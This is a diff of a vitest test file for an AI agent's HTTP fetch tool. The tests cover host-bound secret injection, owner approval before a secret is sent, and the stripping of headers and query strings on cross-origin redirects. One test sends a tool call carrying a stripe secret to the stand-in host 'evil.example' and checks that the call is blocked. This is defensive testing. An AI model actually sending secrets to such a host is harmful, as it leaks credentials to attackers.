@@ -1,10 +1,14 @@
 import { mkdtempSync, rmSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
-import { afterEach, beforeEach, describe, expect, it } from "vitest";
+import { createServer, type IncomingHttpHeaders, type Server } from "node:http";
+import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 
 import { ToolRegistry } from "../agent/registry.js";
+import { GuardedTools } from "../kernel/guarded.js";
 import { ModuleLoader, toolRegistryContext } from "../modules/loader.js";
+import { ApprovalQueue } from "../ops/approvals.js";
+import { AuditLog } from "../ops/audit.js";
 import { SecretsRegistry } from "../secrets/secrets.js";
 import { Workspace } from "../store/workspace.js";
 import { createHttpModule, type FetchImpl } from "./http.js";
@@ -78,22 +82,38 @@ describe("http.fetch module", () => {
     expect(out.body).toContain("kettle 42");
   });
 
-  it("injects secrets into headers before the request", async () => {
-    let seenAuth: string | undefined;
-    const fetchImpl: FetchImpl = async (_url, init) => {
-      seenAuth = (init?.headers as Record<string, string>)?.authorization;
+  it("injects a secret into a header or the query, only for its bound hosts, and nowhere else", async () => {
+    const sent: { url: string; headers: unknown; body: unknown }[] = [];
+    const fetchImpl: FetchImpl = async (url, init) => {
+      sent.push({ url: String(url), headers: init?.headers, body: init?.body });
       return new Response("ok", { status: 200 });
     };
-    const secrets = new SecretsRegistry({ openai: "sk-real" });
-    const registry = await load(
-      { allowedHosts: ["api.example.com"], fetchImpl },
-      secrets,
-    );
-    await registry.execute("http.fetch", {
-      url: "https://api.example.com",
-      headers: { authorization: "Bearer {{secret:openai}}" },
-    });
-    expect(seenAuth).toBe("Bearer sk-real");
+    const secrets = new SecretsRegistry({ openai: "sk-real", stripe: "sk-stripe" }, { openai: { hosts: ["api.example.com"] }, stripe: { hosts: ["api.stripe.com"] } });
+    const registry = await load({ allowedHosts: ["api.example.com", "api.stripe.com", "evil.example"], fetchImpl }, secrets);
+    const approvals = new ApprovalQueue(ws.db);
+    const tools = new GuardedTools({ registry, secrets, audit: new AuditLog(ws.db), approvals });
+    // Every call that sends a secret asks, even to a host on the list: said yes to here.
+    const approved = async (input: Record<string, unknown>): Promise<void> => {
+      const call = tools.execute("http.fetch", input);
+      await vi.waitFor(() => expect(approvals.pending()).toHaveLength(1));
+      expect(approvals.pending()[0]!.reason).toMatch(/^sends secret \w+ to api\.(example|stripe)\.com$/);
+      approvals.approve(approvals.pending()[0]!.id, "owner");
+      await call;
+    };
+
+    await approved({ url: "https://api.example.com/?key={{secret:openai}}", headers: { authorization: "Bearer {{secret:openai}}" } });
+    expect(sent.pop()).toMatchObject({ url: "https://api.example.com/?key=sk-real", headers: { authorization: "Bearer sk-real" } });
+
+    await approved({ url: "https://api.stripe.com/v1", headers: { authorization: "Bearer {{secret:stripe}}" } });
+    expect(sent.pop()).toMatchObject({ headers: { authorization: "Bearer sk-stripe" } });
+
+    const elsewhere = await tools.execute("http.fetch", { url: "https://evil.example/", headers: { authorization: "Bearer {{secret:stripe}}" } });
+    expect(elsewhere).toMatchObject({ isError: true, content: expect.stringMatching(/only to api\.stripe\.com/) });
+    const inPath = await tools.execute("http.fetch", { url: "https://api.example.com/{{secret:openai}}" });
+    expect(inPath).toMatchObject({ isError: true, content: expect.stringMatching(/query string/) });
+    const inBody = await tools.execute("http.fetch", { url: "https://api.example.com/", method: "HEAD", body: "{{secret:openai}}" });
+    expect(inBody).toMatchObject({ isError: true, content: expect.stringMatching(/no secret in body/) });
+    expect(sent).toEqual([]);
   });
 
   it("asks before a write, whatever the host", async () => {
@@ -217,5 +237,83 @@ describe("adding a host without a restart", () => {
     expect(tier()).toBe("safe");
     expect((await registry.execute("http.fetch", { url: "https://late.example.com/x" })).isError).toBeFalsy();
     expect(reached).toHaveLength(1);
+  });
+});
+
+describe("http.fetch redirects", () => {
+  let a: Server;
+  let b: Server;
+  let aBase: string;
+  let bBase: string;
+  const reachedB: { url: string; headers: IncomingHttpHeaders }[] = [];
+
+  const listen = async (server: Server): Promise<string> => {
+    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
+    const address = server.address();
+    return `http://127.0.0.1:${typeof address === "object" && address ? address.port : 0}`;
+  };
+
+  beforeEach(async () => {
+    reachedB.length = 0;
+    b = createServer((req, res) => {
+      reachedB.push({ url: req.url ?? "", headers: req.headers });
+      res.end("host B");
+    });
+    bBase = await listen(b);
+    a = createServer((req, res) => {
+      const url = req.url ?? "/";
+      if (url.startsWith("/away")) return void res.writeHead(302, { location: `${bBase}/landed${url.slice("/away".length)}` }).end();
+      if (url.startsWith("/hop")) return void res.writeHead(301, { location: "/final" }).end();
+      if (url.startsWith("/posted")) return void res.writeHead(Number(url.slice("/posted".length)), { location: "/echo" }).end();
+      if (url.startsWith("/choices")) return void res.writeHead(300, { location: "/final" }).end("pick one");
+      if (url.startsWith("/echo")) return void res.end(`${req.method} ${req.headers["content-type"] ?? "-"} ${req.headers["content-length"] ?? "-"}`);
+      res.end(`host A ${url} ${req.headers["x-api-key"] ?? ""}`);
+    });
+    aBase = await listen(a);
+  });
+
+  afterEach(() => {
+    for (const server of [a, b]) {
+      server.closeAllConnections();
+      server.close();
+    }
+  });
+
+  async function fetchTool(): Promise<ToolRegistry> {
+    const registry = new ToolRegistry();
+    const root = mkdtempSync(join(tmpdir(), "kos-http-redirect-"));
+    const ws = Workspace.open(root);
+    await new ModuleLoader(toolRegistryContext(registry, { workspace: ws, db: ws.db, secrets: new SecretsRegistry() })).load([createHttpModule({ allowedHosts: ["127.0.0.1"], local: true })]);
+    ws.close();
+    rmSync(root, { recursive: true, force: true });
+    return registry;
+  }
+
+  it("follows a redirect within the origin, headers and all", async () => {
+    const res = await (await fetchTool()).execute("http.fetch", { url: `${aBase}/hop`, headers: { "x-api-key": "k-placed" } });
+    expect(JSON.parse(res.content)).toMatchObject({ status: 200, body: "host A /final k-placed" });
+  });
+
+  it("reads again after a 303, and after a POST's 301 or 302, without the body or its headers; keeps the method on a 307", async () => {
+    const tool = await fetchTool();
+    const answer = async (status: number, method: string): Promise<string> =>
+      JSON.parse((await tool.execute("http.fetch", { url: `${aBase}/posted${status}`, method, headers: { "content-type": "application/json" }, body: "{}" })).content).body;
+    expect(await answer(303, "PUT")).toBe("GET - -");
+    expect(await answer(302, "POST")).toBe("GET - -");
+    expect(await answer(301, "PUT")).toBe("PUT application/json 2");
+    expect(await answer(307, "POST")).toBe("POST application/json 2");
+  });
+
+  it("takes a 300 as an answer, not a redirect", async () => {
+    const res = await (await fetchTool()).execute("http.fetch", { url: `${aBase}/choices` });
+    expect(JSON.parse(res.content)).toMatchObject({ status: 300, body: "pick one" });
+  });
+
+  it("does not carry headers or the query to another origin, and says where it pointed", async () => {
+    const res = await (await fetchTool()).execute("http.fetch", { url: `${aBase}/away?k=q-placed`, headers: { "x-api-key": "k-placed" } });
+    expect(reachedB).toEqual([]);
+    const out = JSON.parse(res.content);
+    expect(out).toMatchObject({ status: 302, redirect: `${bBase}/landed?k=q-placed` });
+    expect(out.body).toBeUndefined();
   });
 });
